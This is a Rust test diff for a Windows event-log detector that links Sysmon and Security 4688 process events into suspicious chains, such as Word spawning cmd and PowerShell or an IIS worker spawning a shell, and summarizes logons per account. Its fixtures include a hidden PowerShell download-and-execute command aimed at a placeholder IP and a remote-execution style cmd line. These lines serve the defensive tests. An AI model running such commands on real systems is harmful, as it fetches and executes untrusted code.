@@ -204,3 +204,99 @@ fn attack_samples_raise_the_expected_detections() {
     eprintln!("CA_4624_4625_LogonType2_LogonProc_chrome.evtx: {:?}", quiet.detections.iter().map(|d| d.rule.clone()).collect::<Vec<_>>());
     assert!(missed.is_empty(), "missed: {missed:?}");
 }
+
+fn at(mut e: Event, record: u64, time: &str) -> Event {
+    e.record_id = record;
+    e.time = time.into();
+    e
+}
+
+/// Mission 6: Office → cmd → powershell, from Sysmon 1, linked by GUIDs; the chain keeps what the
+/// log says, why it was flagged and what it may mean apart.
+#[test]
+fn process_chains_link_sysmon_processes_and_flag_unusual_parents() {
+    let events = vec![
+        at(sysmon(1, &[("ProcessGuid", "{A1}"), ("ParentProcessGuid", "{A0}"), ("ProcessId", "4100"), ("Image", r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"), ("CommandLine", r#""WINWORD.EXE" /n "C:\Users\ann\Downloads\invoice.docm""#), ("ParentImage", r"C:\Windows\explorer.exe"), ("User", r"CORP\ann")]), 10, "2026-11-09T10:00:00Z"),
+        at(sysmon(1, &[("ProcessGuid", "{A2}"), ("ParentProcessGuid", "{A1}"), ("ProcessId", "4200"), ("Image", r"C:\Windows\System32\cmd.exe"), ("CommandLine", "cmd.exe /c powershell -nop -w hidden -c iex(iwr http://198.51.100.7/a)"), ("ParentImage", r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"), ("User", r"CORP\ann")]), 11, "2026-11-09T10:00:05Z"),
+        at(sysmon(1, &[("ProcessGuid", "{A3}"), ("ParentProcessGuid", "{A2}"), ("ProcessId", "4300"), ("Image", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"), ("CommandLine", "powershell -nop -w hidden -c iex(iwr http://198.51.100.7/a)"), ("ParentImage", r"C:\Windows\System32\cmd.exe"), ("User", r"CORP\ann")]), 12, "2026-11-09T10:00:06Z"),
+        // an ordinary shell from Explorer is not flagged
+        at(sysmon(1, &[("ProcessGuid", "{B1}"), ("ParentProcessGuid", "{A0}"), ("ProcessId", "5000"), ("Image", r"C:\Windows\System32\cmd.exe"), ("CommandLine", "cmd.exe"), ("ParentImage", r"C:\Windows\explorer.exe"), ("User", r"CORP\ann")]), 13, "2026-11-09T10:01:00Z"),
+    ];
+    let r = run(&events);
+    assert_eq!(r.chains.len(), 1, "{:?}", r.chains);
+    let c = &r.chains[0];
+    assert_eq!((c.pattern.as_str(), c.technique.as_str(), c.computer.as_str()), ("CHAIN-OFFICE-SHELL", "T1204.002 User Execution: Malicious File", "WS01.corp.example"));
+    let roles: Vec<(&str, i32, u64)> = c.processes.iter().map(|p| (p.role.as_str(), p.depth, p.record)).collect();
+    // Explorer is known only by name (it started before the log); Word, then cmd, then what cmd started
+    assert_eq!(roles, [("ancestor", -2, 0), ("ancestor", -1, 10), ("flagged", 0, 11), ("descendant", 1, 12)]);
+    assert!(c.processes[1].command_line.contains("invoice.docm"));
+    assert!(c.why.contains("macro") && c.hypotheses.contains("Rule out"), "the derived signal and the hypotheses are separate texts");
+    // the single-event detections still run alongside
+    assert!(rule(&r, "EVT-DOWNLOAD-COMMAND").is_some());
+}
+
+#[test]
+fn process_chains_from_4688_use_process_ids_and_parents_known_only_by_name() {
+    let events = vec![
+        // IIS worker started before the log: only its name is in the child's event
+        at(sec(4688, &[("NewProcessId", "0x1a4"), ("ProcessId", "0x9c"), ("NewProcessName", r"C:\Windows\System32\cmd.exe"), ("CommandLine", r#"cmd.exe /c "whoami""#), ("ParentProcessName", r"C:\Windows\System32\inetsrv\w3wp.exe"), ("SubjectUserName", "IIS APPPOOL"), ("SubjectDomainName", "CORP")]), 20, "2026-11-09T11:00:00Z"),
+        at(sec(4688, &[("NewProcessId", "0x1b0"), ("ProcessId", "0x1a4"), ("NewProcessName", r"C:\Windows\System32\whoami.exe"), ("CommandLine", "whoami"), ("ParentProcessName", r"C:\Windows\System32\cmd.exe"), ("SubjectUserName", "IIS APPPOOL"), ("SubjectDomainName", "CORP")]), 21, "2026-11-09T11:00:01Z"),
+        // a service-started shell
+        at(sec(4688, &[("NewProcessId", "0x200"), ("ProcessId", "0x2a0"), ("NewProcessName", r"C:\Windows\System32\cmd.exe"), ("CommandLine", r"cmd.exe /Q /c echo whoami ^> \127.0.0.1\C$\__output"), ("ParentProcessName", r"C:\Windows\System32\services.exe"), ("SubjectUserName", "WS01$"), ("SubjectDomainName", "CORP")]), 22, "2026-11-09T11:05:00Z"),
+    ];
+    let r = run(&events);
+    let ids: Vec<&str> = r.chains.iter().map(|c| c.pattern.as_str()).collect();
+    assert_eq!(ids, ["CHAIN-WEB-SERVER-SHELL", "CHAIN-SERVICE-SHELL"], "high first");
+    let web = &r.chains[0];
+    assert_eq!(web.technique, "T1505.003 Server Software Component: Web Shell");
+    let rows: Vec<(&str, &str, &str)> = web.processes.iter().map(|p| (p.role.as_str(), p.pid.as_str(), p.image.rsplit('\\').next().unwrap())).collect();
+    assert_eq!(rows, [("ancestor", "", "w3wp.exe"), ("flagged", "420", "cmd.exe"), ("descendant", "432", "whoami.exe")]);
+    // no technique is claimed where the relationship does not show one
+    let lsass = run(&[at(sec(4688, &[("NewProcessId", "0x300"), ("ProcessId", "0x2c0"), ("NewProcessName", r"C:\Users\Public\x.exe"), ("ParentProcessName", r"C:\Windows\System32\lsass.exe")]), 30, "2026-11-09T12:00:00Z")]);
+    assert_eq!((lsass.chains[0].pattern.as_str(), lsass.chains[0].technique.as_str()), ("CHAIN-LSASS-CHILD", ""));
+}
+
+#[test]
+fn process_chains_are_bounded_and_logons_are_summarized_per_account() {
+    let mut events = Vec::new();
+    for i in 0..120u64 {
+        events.push(at(sysmon(1, &[("ProcessGuid", &format!("{{C{i}}}")), ("ParentProcessGuid", "{W}"), ("ProcessId", &i.to_string()), ("Image", r"C:\Windows\System32\cmd.exe"), ("CommandLine", "cmd /c whoami"), ("ParentImage", r"C:\Windows\System32\inetsrv\w3wp.exe")]), i + 1, "2026-11-09T10:00:00Z"));
+    }
+    let r = run(&events);
+    assert_eq!(r.chains.len(), 50, "50 per pattern");
+    assert!(r.warnings.iter().any(|w| w.contains("70 more flagged process relationships")), "{:?}", r.warnings);
+
+    let mut logons = Vec::new();
+    for (i, (user, ip, ty)) in [("ann", "10.0.0.5", "3"), ("ann", "10.0.0.5", "3"), ("ann", "198.51.100.9", "10"), ("WS01$", "10.0.0.9", "3"), ("SYSTEM", "", "5")].iter().enumerate() {
+        logons.push(at(sec(4624, &[("TargetUserName", user), ("TargetDomainName", "CORP"), ("IpAddress", ip), ("LogonType", ty)]), i as u64 + 1, &format!("2026-11-09T10:0{i}:00Z")));
+    }
+    logons.push(at(sec(4625, &[("TargetUserName", "ann"), ("TargetDomainName", "CORP"), ("IpAddress", "203.0.113.5"), ("LogonType", "3")]), 9, "2026-11-09T09:00:00Z"));
+    let r = run(&logons);
+    assert_eq!(r.logons.len(), 1, "machine and system identities are left out: {:?}", r.logons);
+    let ann = &r.logons[0];
+    assert_eq!((ann.account.as_str(), ann.logons, ann.failures), (r"CORP\ann", 3, 1));
+    assert_eq!(ann.types, [("10".to_string(), 1), ("3".to_string(), 2)]);
+    assert_eq!(ann.sources[0], ("10.0.0.5".to_string(), 2));
+    assert_eq!((ann.first.as_str(), ann.last.as_str()), ("2026-11-09T09:00:00Z", "2026-11-09T10:02:00Z"));
+}
+
+/// Mission 6: process chains on the public EVTX-ATTACK-SAMPLES files (set CYBERHUB_EVTX_DIR).
+#[test]
+#[ignore]
+fn attack_samples_process_chains() {
+    let dir = std::path::PathBuf::from(std::env::var("CYBERHUB_EVTX_DIR").expect("CYBERHUB_EVTX_DIR"));
+    let mut names: Vec<_> = std::fs::read_dir(&dir).unwrap().flatten().map(|e| e.path()).filter(|p| p.extension().is_some_and(|x| x == "evtx")).collect();
+    names.sort();
+    for p in names {
+        let r = analyze(std::fs::File::open(&p).unwrap()).unwrap();
+        let chains: Vec<String> = r.chains.iter().map(|c| format!("{} [{}]", c.pattern, c.processes.iter().map(|x| format!("{}:{}", x.role.chars().next().unwrap(), x.image.rsplit(['\\', '/']).next().unwrap_or(""))).collect::<Vec<_>>().join(" > "))).collect();
+        let name = p.file_name().unwrap().to_string_lossy().to_string();
+        println!("CHAINS {name} -> {} chains, {} accounts: {}", r.chains.len(), r.logons.len(), chains.join(" | "));
+        // the two samples whose processes form a flagged relationship
+        match name.as_str() {
+            "LM_sysmon_psexec_smb_meterpreter.evtx" => assert_eq!(chains, ["CHAIN-SERVICE-SHELL [a:services.exe > f:cmd.exe > d:powershell.exe > d:powershell.exe]"]),
+            "sysmon_10_1_memdump_comsvcs_minidump.evtx" => assert_eq!(chains, ["CHAIN-WMI-SHELL [a:WmiPrvSE.exe > f:rundll32.exe]"]),
+            _ => {}
+        }
+    }
+}
